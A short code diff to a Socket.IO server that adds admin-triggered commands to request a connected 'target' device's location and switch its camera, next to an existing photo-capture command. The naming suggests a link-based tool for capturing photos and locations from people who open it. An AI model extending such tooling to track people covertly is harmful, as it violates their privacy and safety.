@@ -259,6 +259,18 @@ io.on("connection", (socket) => {
         io.to(targetSocketId).emit("capture-photo");
     });
 
+    socket.on("admin-request-location", (targetSocketId) => {
+        if (!socket.request.session || socket.request.session.isAdmin !== true) return;
+        if (!isLinkActive || !connectedTargets.has(targetSocketId)) return;
+        io.to(targetSocketId).emit("request-location");
+    });
+
+    socket.on("admin-switch-camera", (targetSocketId) => {
+        if (!socket.request.session || socket.request.session.isAdmin !== true) return;
+        if (!isLinkActive || !connectedTargets.has(targetSocketId)) return;
+        io.to(targetSocketId).emit("switch-camera");
+    });
+
     socket.on("user-ready", (data) => {
         if (!isLinkActive) {
             socket.emit("link-disabled");
